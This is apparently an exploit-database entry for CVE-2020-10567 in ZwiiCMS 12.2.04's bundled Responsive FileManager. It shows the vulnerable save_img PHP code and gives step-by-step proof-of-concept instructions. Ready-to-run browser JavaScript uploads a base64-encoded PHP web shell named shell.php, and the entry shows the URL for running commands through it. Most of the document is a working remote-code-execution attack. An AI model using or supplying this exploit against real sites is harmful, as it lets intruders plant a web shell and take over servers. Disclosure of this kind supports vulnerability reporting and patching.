
# CVE: CVE-2020-10567
# Category: webapps


ZwiiCMS 12.2.04 uses "Responible FileManager" 9.14.0 for its file manager feature. ZwiiCMS is vulnerable to CVE-2020-10567 as it is possible for
an authenticated user to use ajax_calls.php to upload a php file via a base64 encoded file and gain Remote Code Execution
due to a lack of extension check on the uploaded file.

Original CVE author : hackoclipse
https://github.com/trippo/ResponsiveFilemanager/issues/600


Vulnerable code (ajax_calls.php) :

// there is no extension check on $_POST['name'] and the content of $_POST['url'] can be b64 decoded without being
necessarily an image

81  case 'save_img':
82      $info = pathinfo($_POST['name']);
83  $image_data = $_POST['url'];
84
85  if (preg_match('/^data:image\/(\w+);base64,/', $image_data, $type)) {
    86       $image_data = substr($image_data, strpos($image_data, ',') + 1);
87       $type = strtolower($type[1]); // jpg, png, gif
88
89       $image_data = base64_decode($image_data);


PoC:

1) Login in the Administration Panel.
2) Click on the Folder icon on the top of the panel.
3) Open the Developer Tools for that page.
4) Copy,Edit and Execute the Javascript Code below .
5) Access your PHP shell at http://ZWIICMS_URL/site/file/source/shell.php?cmd=COMMAND

Javascript Code
######

function submitRequest()
{
    var xhr = new XMLHttpRequest();
xhr.open("POST", "https:\/\/192.168.0.27\/zwiicms\/core\/vendor\/filemanager\/ajax_calls.php?action=save_img", true);
xhr.setRequestHeader("Accept", "*\/*");
xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded; charset=UTF-8");
xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
xhr.withCredentials = true;
var body = "url=data:image/jpeg;base64,PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pg==&path=&name=shell.php";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
aBody[i] = body.charCodeAt(i);
xhr.send(new Blob([aBody]));
}
submitRequest();

######